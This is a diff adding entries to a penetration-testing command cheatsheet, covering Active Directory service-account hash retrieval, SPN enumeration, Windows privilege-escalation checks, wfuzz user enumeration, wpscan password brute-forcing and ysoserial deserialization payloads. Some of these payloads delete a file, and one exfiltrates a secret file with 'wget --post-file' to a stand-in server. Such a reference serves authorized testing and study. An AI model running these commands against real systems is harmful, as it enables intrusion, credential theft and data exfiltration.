@@ -341,6 +341,10 @@ cd cheatsheet-pentesting
   ```powershell
   GMSAPasswordReader.exe <gMSA-Name>
   ```
+- **Retrieving the Hash of a Service Account**:
+  ```powershell
+  ./GMSAPasswordReader.exe --accountname svc_apache
+  ```
 
 ---
 
@@ -354,7 +358,11 @@ cd cheatsheet-pentesting
   ```powershell
   GetSPN -Domain <domain> -Username <username> > spns.txt
   ```
-
+- **Retrieving Service Names from Active Directory**:
+  ```powershell
+  Get-NetUser -SPN | Select-Object serviceprincipalname
+  Get-NetUser -SPN | select serviceprincipalname
+  ```
 ---
 
 ### PowerUp
@@ -388,6 +396,7 @@ cd cheatsheet-pentesting
 - **Run Privilege Escalation Checks**:
   ```powershell
   .\PrivescCheck.ps1
+  Invoke-PrivescCheck -Extended
   ```
 
 ---
@@ -416,6 +425,17 @@ cd cheatsheet-pentesting
   accesschk.exe -k <registry-key-path>
   ```
 
+- **Check for Vulnerable Services to Exploit**:
+  ```bash
+  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+  ```
+  u: Check the permissions for the user or group specified.
+  w: Look for write permissions.
+  c: Check for the ability to change service configurations.
+  q: Suppress warnings and only display the output.
+  v: Verbose output.
+  Authenticated Users: Specifies the target user group. This tells the tool to check permissions for all authenticated users.
+  *: Checks all services on the system for the specified permissions.
 ---
 
 ### apt
@@ -1720,9 +1740,25 @@ cd cheatsheet-pentesting
   ```
 
 ### Webservers
-- **Start a Simple Python Web Server**:
+- **Start a Simple Python Web Server using Python 2**:
+  ```bash
+  python -m SimpleHTTPServer  <port>
+  ```
+- **Start a Simple Python Web Server using Python 3**:
   ```bash
   python -m http.server <port>
+  ```
+- **Start a Simple PHP Web Server**:
+  ```bash
+  php -S 0.0.0.0:8000
+  ```
+- **Start a Simple Ruby Web Server**:
+  ```bash
+  ruby -run -e httpd . -p 9000
+  ```
+- **Start a Simple BusyBox Web Server**:
+  ```bash
+  busybox httpd -f -p 10000
   ```
 
 ### WFuzz
@@ -1735,21 +1771,46 @@ cd cheatsheet-pentesting
   ```bash
   wfuzz -c -z file,<wordlist> -d "param=FUZZ" <url>
   ```
-
+- **User Enumeration with Password Reset Function:**:
+  ```bash
+  wfuzz -c -L -u "<URL>/ResetPasswordController.php" -d "email=FUZZ@test.local&Submit=" -b "PHPSESSID=FUZZ" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hs
+  ```
+  
 ### Whois
 - **Query Domain Information**:
   ```bash
   whois <domain>
   ```
-
+- **Query Domain Information Using a Specific WHOIS Server**:
+  ```bash
+  whois <domain>  -h <IP>
+  ```
+  This command queries domain information but specifies an external WHOIS server using the -h option.
+- **Reverse Whois Lookup**:
+  ```bash
+  whois <IP> -h <IP>
+  ```
+  This command performs a reverse lookup by providing an IP address, allowing you to gather information about the domain or entity associated with the IP.
 ### Wpscan
+
 - **Scan a WordPress Site**:
   ```bash
   wpscan --url <site_url>
   ```
 
-- **Enumerate Plugins**:
+- **Brute-Forcing the User Credentials**:
   ```bash
+  wpscan --url http://192.168.217.52/ -U tester -P /usr/share/wordlists/rockyou.txt
+  ```
+
+- **basic Enumeration**:
+  ```bash
+  wpscan --url vulnserver.local --enumerate ap,at,cb,dbe
+  ```
+
+- **Plugins Enumeration**:
+  ```bash
+  wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
   wpscan --url <site_url> --enumerate p
   ```
 
@@ -1757,6 +1818,15 @@ cd cheatsheet-pentesting
 - **Connect to an RDP Server**:
   ```bash
   xfreerdp /u:<username> /p:<password> /v:<host>
+  ```
+- **Connecting to the host with xfreerdp**:
+  ```bash
+  xfreerdp /d:sandbox /u:tester /v:10.10.10.10 +clipboard
+  ```
+
+- **Connecting and sharing a folder**:
+  ```bash
+  xfreerdp /d:sandbox /u:tester /v:10.5.5.20 /drive:/root/oscp/temp /dynamic-resolution +clipboard
   ```
 
 ### Xxd
@@ -1769,12 +1839,33 @@ cd cheatsheet-pentesting
   ```bash
   xxd -r <hex_file>
   ```
+- **Hex Dump a File Byte by Byte**:
+  ```bash
+  xxd -g 1 file
+  ```
+  The `xxd` command with the `-g 1` flag generates a hex dump of the file, splitting each byte into its own column. This is useful for analyzing files at a very granular level or for debugging binary data.
+
 
 ### Ysoserial
+
 - **Generate a Payload**:
   ```bash
   java -jar ysoserial.jar <payload_type> "<command>"
-  
+  ```
+
+  Use the `ysoserial` tool to generate serialized payloads for exploitation or testing. Replace `<payload_type>` with the appropriate payload and `<command>` with the command to execute.
+
+- **Delete a File**:
+  ```bash
+    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/test/test.txt' | base64
+    ```
+    This example generates a serialized payload using the `CommonsCollections4` exploit, which deletes the `test.txt` file from the specified directory. The payload is then encoded in Base64 for transmission.
+
+- **Exfiltrate a Secret File**:
+  ```bash
+    java -jar /oscp/Cassios/ysoserial-all.jar CommonsCollections6 'wget --post-file=/home/test/secret fakeserver.local' | gzip -f | base64 -w0
+    ```
+    This example creates a payload using the `CommonsCollections6` exploit to exfiltrate the `secret` file from the target. It sends the file as a POST request to a remote server using `wget`. The payload is compressed with `gzip` and encoded in Base64 for delivery.
 
 
 ---
